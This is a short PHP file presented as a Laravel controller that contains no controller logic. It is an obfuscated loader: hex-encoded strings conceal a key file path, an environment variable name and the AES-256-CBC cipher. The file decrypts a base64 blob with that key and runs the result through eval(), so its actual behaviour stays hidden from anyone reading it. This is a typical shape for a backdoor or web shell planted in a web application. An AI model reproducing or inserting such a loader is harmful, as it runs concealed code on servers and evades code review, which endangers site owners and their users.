<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('1c8Q5heYQ2pADpYZ2wsGUg==');

$c=base64_decode(

'IS6i3k1M6l7w9hFqdJBTycSY80Votywz8p2Yxc0ADXhQ/vPpKzQgXOPsUaL0e6CKpKqTkLPzIrXN' .
'zZv6Q6kT3aZdnpU3LH2668XfWTXz7tQe6ts04DU3wecRKP7Tw3S8/yXw48hp0Pg3WBp4tKUTMJtw' .
'2QudD4S4pNdp8+ODSvyiPWy8R2OJEvNISJ7QX8ZZYcNseg5GZGRnK0tHmlDsTXxmbTy6qOhOdTwI' .
'H84imj0Fwkc5IY9uV1CXFyJdxmxWxB3xYK3BrFv70RpG2PUbog=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

